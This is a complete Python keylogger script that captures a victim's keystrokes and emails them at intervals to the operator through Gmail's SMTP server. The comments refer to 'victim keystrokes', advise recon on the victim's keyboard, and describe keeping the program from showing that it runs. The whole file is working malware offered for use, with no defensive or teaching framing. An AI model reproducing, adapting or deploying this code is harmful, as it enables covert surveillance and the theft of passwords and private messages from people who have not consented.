#!/usr/bin/python3

import argparse
import keyboard #pip3 install keyboard
import smtplib #to send emails
from threading import Semaphore, Timer #will run the email function after interval of time

#Did you go into gmail settings, and turn on 'less secure app access' ?

#usage
parser = argparse.ArgumentParser(description="Usage example: \033[1;33;40m sudo python3 logger.py -e gmail@Address -p Password -l 60 \033[0;37;40m")
parser.add_argument("-e", "--email", help="input your gmail", required=True)
parser.add_argument("-p", "--password", help="input your gmail password", required=True)
parser.add_argument("-l", "--length", help="choose how often you want to be emailed. Default if you don't choose is every 60 seconds", type=int, default=60, required=False)
args = parser.parse_args()
print("\nWill log victim keystrokes, and report back to\033[1;33;40m " + args.email + "\033[0;37;40m every\033[1;33;40m " + str(args.length) + " \033[0;37;40mseconds") #we need to pass arg.length as an integer, otherwise the script gets upset. Same as in the line above, where w econfirm the type is an int

#email info
send_report_every = args.length
email_address = args.email
email_password = args.password

#keylogger functions
class Keylogger:
	def __init__(self, interval):
		self.interval = interval
		self.log = "" # keystrokes are contained with self.interval, this variable contains the log
		self.semaphore = Semaphore(0) #for blocking after setting the on_release listener

# make note when a key is pressed
	def callback(self, event):
		name = event.name
		if len(name) > 1:
			if name == "space":
				name = " "
			elif name == "enter":              
                		name = "[ENTER]\n" # add a new line whenever an ENTER is pressed
			elif name =="decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"
#Whole section for passing special chars.
#This section could be absolute trash, as it's keyboard dependent. Mine was based on a Macbook keyboard
#You may want to do some recon and find out the victim keyboard, and then base the shifted keys on that keyboard.

			if keyboard.is_pressed("shift") and name == "1":
				name = "!"
			if keyboard.is_pressed("shift") and name == "2":
				name ="@"
			if keyboard.is_pressed("shift") and name == "3":
				name ="£"
			if keyboard.is_pressed("shift") and name == "4":
				name ="$"
			if keyboard.is_pressed("shift") and name == "5":
				name ="%"
			if keyboard.is_pressed("shift") and name == "6":
				name ="^"
			if keyboard.is_pressed("shift") and name == "7":
				name ="&"
			if keyboard.is_pressed("shift") and name == "8":
				name ="*"
			if keyboard.is_pressed("shift") and name == "9":
				name ="("
			if keyboard.is_pressed("shift") and name == "0":
				name =")"
			if keyboard.is_pressed("shift") and name == "-":
				name ="_"
			if keyboard.is_pressed("shift") and name == ",":
				name ="<"
			if keyboard.is_pressed("shift") and name == ".":
				name =">"
			if keyboard.is_pressed("shift") and name == "/":
				name ="?"
			if keyboard.is_pressed("shift") and name == "=":
				name ="+"
			if keyboard.is_pressed("shift") and name == "[":
				name ="{"
			if keyboard.is_pressed("shift") and name == "]":
				name ="}"
			if keyboard.is_pressed("shift") and name == "'":
				name ='"'
			if keyboard.is_pressed("shift") and name == "`":
				name ="~"
			if keyboard.is_pressed("shift") and name == ";":
                                name = ":"
			if keyboard.is_pressed("shift") and name == "\\":
				name = "|"
		self.log += name

#send logged keys in an email to ourselves
	def sendmail(self, email, password, message):
		server = smtplib.SMTP(host="smtp.gmail.com",port=587) #login details for next few lines
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message) #sends the logged keys in a report
		server.quit() # terminate session


#send that email after an interval
#also checks if the user pressed anything. If they didn't, don't bother send, but if they did, sen the email
	def report(self):
		if self.log:
			self.sendmail(email_address, email_password, self.log)
		self.log = ""
		Timer(interval=self.interval, function=self.report).start()

#start the keylogger
	def start(self):
		keyboard.on_release(callback=self.callback)
		self.report()
		self.semaphore.acquire() #sempahore exists to make sure that when executed, the program doesn't show its running

if __name__ == "__main__":
    keylogger = Keylogger(interval=send_report_every)
    keylogger.start()
